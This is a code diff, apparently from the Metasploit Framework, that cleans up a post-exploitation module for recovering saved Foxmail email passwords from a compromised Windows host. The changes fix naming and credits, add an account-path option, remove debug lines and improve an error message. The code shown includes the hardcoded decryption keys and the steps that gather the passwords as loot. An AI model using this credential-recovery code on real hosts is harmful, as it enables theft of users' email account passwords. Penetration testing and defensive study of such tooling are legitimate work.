@@ -10,17 +10,18 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'Windows Gather foxmail Passwords',
+        'Name' => 'Windows Gather Foxmail Passwords',
         'Description' => %q{
           This module can decrypt the password of foxmail,
           if the user chooses to remember the password.
         },
         'License' => MSF_LICENSE,
         'References' => [
-          [ 'URL', 'https://github.com/HyperSine/how-does-foxmail-encrypt-password/blob/master/doc/how-does-foxmail-encrypt-password.md']
+          [ 'URL', 'https://github.com/jacobsoo/FoxmailRecovery']
         ],
         'Author' => [
-          'Kali-Team <kali-team[at]qq.com>'
+          'jacobsoo', # Original author of the Foxmail account decryption script.
+          'Kali-Team <kali-team[at]qq.com>' # Metasploit module
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ]
@@ -28,7 +29,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptString.new('Passphrase', [ false, 'If the user sets the master password, e.g.:123456']),
+        OptString.new('ACCOUNT_PATH', [ false, 'Specifies the Account directory path for Foxmail']),
       ]
     )
   end
@@ -59,7 +60,7 @@ class MetasploitModule < Msf::Post
       account_paths.push(account_path + '.tdat') if session.fs.file.exist?(account_path + '.tdat')
     end
     tbl = []
-    print_status("Search session files on #{fpath}")
+    print_status("Search account files on #{fpath}")
 
     # enum session file
     account_paths.each do |file_name|
@@ -119,7 +120,6 @@ class MetasploitModule < Msf::Post
   def foxmail_crypto(version, ciphertext)
     miag_crypt = '~draGon~'
     v7_miag_crypt = '~F@7%m$~'
-    # require 'pry';binding.pry
     fc0 = '5A'.to_i(16)
     if version == 1
       miag_crypt = v7_miag_crypt.unpack('c*')
@@ -154,17 +154,20 @@ class MetasploitModule < Msf::Post
       end
     end
     e = e[0..-2]
-    # require 'pry'; binding.pry
     return e.pack('C*')
   end
 
   def run
-    print_status("Gather foxmail Passwords on #{sysinfo['Computer']}")
-    # HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview
-    parent_key = 'HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview'
+    print_status("Gather Foxmail Passwords on #{sysinfo['Computer']}")
     # get session file path
-    foxmail_path = expand_path(registry_getvaldata(parent_key, 'Executable'))
-    foxmail_path = foxmail_path[0, foxmail_path.rindex('\\') + 1] + 'Storage'
+    foxmail_path = ''
+    if datastore['ACCOUNT_PATH'].to_s.empty?
+      parent_key = 'HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview'
+      root_path = registry_getvaldata(parent_key, 'Executable')
+      foxmail_path = root_path[0, root_path.rindex('\\') + 1] + 'Storage' if !root_path.to_s.empty?
+    else
+      foxmail_path = expand_path(datastore['ACCOUNT_PATH'])
+    end
     if foxmail_path
       result = enum_session_file(foxmail_path)
       columns = [
@@ -183,11 +186,11 @@ class MetasploitModule < Msf::Post
       end
       print_line(tbl.to_s)
       if tbl.rows.count
-        path = store_loot('host.foxmail_password', 'text/plain', session, tbl, 'foxmail_password.txt', 'foxmail Passwords')
+        path = store_loot('host.foxmail_password', 'text/plain', session, tbl.to_s, 'foxmail_password.txt', 'foxmail Passwords')
         print_good("Passwords stored in: #{path}")
       end
     else
-      print_error('Session path not found')
+      print_error('Could not find the registry entry for the Foxmail account path. Ensure that Foxmail is installed on the target.')
     end
   end
 end
